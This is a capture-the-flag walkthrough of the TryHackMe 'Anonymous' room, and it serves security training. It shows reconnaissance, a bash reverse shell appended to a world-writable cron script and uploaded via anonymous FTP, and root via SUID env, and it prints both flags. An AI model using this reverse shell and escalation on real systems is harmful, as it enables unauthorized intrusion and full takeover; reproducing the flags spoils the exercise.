# 🛡️ TryHackMe – Anonymous - Writeup

## 📌 Overview
**Room Name:** Anonymous  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** FTP / SMB / Cron / PrivEsc

Linux machine with anonymous FTP exposing a world-writable cron script. Observing the log file's timestamp reveals periodic execution; replacing the script via FTP delivers a reverse shell. SUID `env` provides trivial escalation to root.

Attack chain overview:

- Port scan → anonymous FTP with writable `scripts/` directory, SMB share
- FTP reveals `clean.sh` (world-writable, cron-executed) and `removed_files.log` (updating live)
- SMB `pics` share investigated and eliminated as a rabbit hole
- Reverse shell injected into `clean.sh`, re-uploaded via FTP → shell as `namelessone`
- SUID `/usr/bin/env` → `env /bin/sh -p` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
21/tcp  open  ftp          vsftpd 3.0.3
22/tcp  open  ssh          OpenSSH 7.6p1
139/tcp open  netbios-ssn  Samba
445/tcp open  microsoft-ds Samba 4.7.6
```

Key nmap script output:

```text
ftp-anon: Anonymous FTP login allowed
  drwxrwxrwx  scripts  [NSE: writeable]

smb2-security-mode:
  message_signing: disabled
  account_used: guest
```

Anonymous FTP with a writable directory was the immediate priority.

---

## 🔍 2. FTP Investigation

```bash
ftp <TARGET_IP>
# user: anonymous / pass: (blank)

cd scripts
ls -la
```

```text
-rwxr-xrwx  clean.sh
-rw-rw-r--  removed_files.log
-rw-r--r--  to_do.txt
```

Downloaded all three files for inspection.

**`to_do.txt`:**
```text
I really need to disable the anonymous login...it's really not safe
```

**`clean.sh`:**
```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" \
          >> /var/ftp/scripts/removed_files.log
    done
fi
```

**`removed_files.log`:** initially empty, but its timestamp updated a few minutes after the initial scan.

Three facts converged into the attack path:

- `removed_files.log` was being written to periodically → `clean.sh` is running under cron
- `clean.sh` permissions are `rwxr-xrwx` → the `other` category has write access
- Anonymous FTP users are treated as `other` → FTP upload = script modification
- The log path `/var/ftp/scripts/` confirms FTP root is `/var/ftp/`

---

## 🔍 3. SMB Investigation (Rabbit Hole)

```bash
smbclient -L //<TARGET_IP>/ -N
```

```text
pics    - My SMB Share Directory for Pics
```

```bash
smbclient //<TARGET_IP>/pics -N
get corgo2.jpg
get puppos.jpeg
```

Both images were checked for hidden data:

```bash
steghide info corgo2.jpg      # no embedded data (empty passphrase)
steghide info puppos.jpeg     # no embedded data
stegseek -sf corgo2.jpg /usr/share/wordlists/rockyou.txt   # no match
stegseek -sf puppos.jpeg /usr/share/wordlists/rockyou.txt  # no match
exiftool corgo2.jpg    # no anomalies
exiftool puppos.jpeg   # standard commercial photo metadata
```

Neither image contained steganographic content. The SMB share was a dead end — eliminated and focus returned to the FTP cron vector.

---

## 🔓 4. Initial Access — Cron Script Hijacking

Added a reverse shell to `clean.sh`:

```bash
# Appended to clean.sh
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
```

Started a listener, then uploaded the modified script via FTP:

```bash
nc -lvnp 4444
```

```bash
ftp <TARGET_IP>
cd scripts
put clean.sh
```

When cron executed `clean.sh`, the reverse shell connected:

```text
namelessone@anonymous:~$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat user.txt
# 90d6f992585815ff991e68748c414740
```

**Initial access as `namelessone` achieved.** ✅

---

## 👑 5. Privilege Escalation: namelessone → root

`sudo -l` was unavailable due to a missing TTY. Moved directly to SUID enumeration:

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/env      ← abnormal — env should never carry SUID
/usr/bin/pkexec
...
```

`/usr/bin/env` with SUID is immediately exploitable. `env` executes an arbitrary command in a modified environment; with the SUID bit set it runs that command as root:

```bash
/usr/bin/env /bin/sh -p
whoami
# root
```

**ROOT ACCESS GRANTED.** ✅

```bash
cat /root/root.txt
# 4d930091c31a622a7ed10f27999af363
```

---

## 🏁 Flags

### 🧍 User Flag

```
90d6f992585815ff991e68748c414740
```

### 👑 Root Flag

```
4d930091c31a622a7ed10f27999af363
```

---

## 📚 Key Takeaways

- ⏱️ **Log file timestamps reveal cron activity:** `removed_files.log` was being written to on a regular interval without any user interaction. Observing file timestamps after initial enumeration — before taking any action — is an easy way to detect scheduled execution.

- ✍️ **World-writable cron scripts are a direct shell:** The combination of `rwxr-xrwx` on `clean.sh` and anonymous FTP write access creates a complete chain: modify locally, re-upload, wait for cron. No exploit needed — just file permissions.

- 🐕 **SMB shares in CTFs are often rabbit holes — but still check them:** The `pics` share looked promising by name. Eliminating it systematically (steghide, stegseek, exiftool) took minutes and removed any doubt. Skipping it would leave uncertainty; spending too long on it wastes time.

- 🔑 **`/usr/bin/env` with SUID is a one-liner to root:** `env` is a utility for setting environment variables — it has no business running as root. Any SUID binary outside the expected set (`passwd`, `su`, `ping`, etc.) is worth immediate investigation. GTFOBins lists the exact command.

---

## 🛠️ Tools Used

- `rustscan`
- `ftp`
- `smbclient`
- `steghide`, `stegseek`, `exiftool`
- `nc` (netcat)
- `python3` (PTY stabilization)
- `find` (SUID search)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
